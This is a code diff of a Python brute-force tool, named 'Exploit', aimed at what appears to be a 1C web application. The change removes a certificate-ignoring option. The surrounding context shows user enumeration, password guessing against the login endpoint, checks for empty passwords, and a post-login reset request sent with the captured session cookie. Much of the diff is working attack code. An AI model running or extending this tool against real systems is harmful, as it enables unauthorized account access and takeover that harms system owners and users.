@@ -65,7 +65,6 @@ def config_logging(level=logging.INFO):
 class Verbosity(enum.Enum):
     DEBUG = logging.DEBUG
     INFO = logging.INFO
-    WARNING = logging.WARNING
 
     @classmethod
     def from_str(cls, value: str):
@@ -138,12 +137,6 @@ def parse_args() -> argparse.Namespace:
     )
 
     parser.add_argument(
-        "--ignore-invalid-certificate",
-        action="store_true",
-        help="Ignore untrusted certs"
-    )
-
-    parser.add_argument(
         "--check-empty-passwords",
         action="store_true",
         help="Check for users with empty passwords"
@@ -174,7 +167,7 @@ def parse_args() -> argparse.Namespace:
         metavar="verbosity",
         type=Verbosity.from_str,
         choices=list(Verbosity),
-        help="Set the logging verbosity level",
+        help="Set the logging verbosity level (DEBUG, INFO)",
         default=Verbosity.INFO
     )
 
@@ -194,7 +187,6 @@ class ExploitConfig(object):
     usernames_file: pathlib.Path
     startAt: int
     delay: int
-    ignoreBadCerts: bool
     check_empty_passwords: bool
     get_users: bool
 
@@ -278,9 +270,7 @@ class Exploit(object):
         """
         url = f"{self.config.target}/{self.config.lang}/e1cib/users"
         try:
-            response = requests.post(
-                url, verify=not self.config.ignoreBadCerts
-            )
+            response = requests.post(url)
             response.raise_for_status()
 
             user_data = response.text
@@ -315,9 +305,7 @@ class Exploit(object):
     def _determine_version(self) -> str:
         url = f"{self.config.target}/"
         try:
-            response = requests.post(
-                url, verify=not self.config.ignoreBadCerts
-            )
+            response = requests.post(url)
             version_match = re.search(
                 r'var VERSION = "([\d.]+)"',
                 response.text
@@ -348,9 +336,7 @@ class Exploit(object):
         cred = self._prepare_cred(login, password)
         url = f"{self.config.target}/{self.config.lang}/e1cib/login?version={self.config.version}&cred={cred}&vl={self.config.lang}&clnId={self.config.clnId}"  # noqa
         try:
-            response = requests.post(
-                url, verify=not self.config.ignoreBadCerts
-            )
+            response = requests.post(url)
             logging.debug(f"[{response.status_code}] {login}:{password}")
             match response.status_code:
                 case 200:
@@ -365,8 +351,7 @@ class Exploit(object):
                         requests.post(
                             self.config.reset_url,
                             headers={"Cookie": cookie},
-                            json=self.config.reset_data,
-                            verify=not self.config.ignoreBadCerts
+                            json=self.config.reset_data
                         )
                     if self.config.save_results:
                         FileHandler.save_line(
@@ -450,7 +435,6 @@ def main():
         passwords_file=args.Passwords,
         startAt=args.startat,
         delay=args.delay,
-        ignoreBadCerts=args.ignore_invalid_certificate,
         check_empty_passwords=args.check_empty_passwords,
         get_users=args.get_users,
         version=args.version,
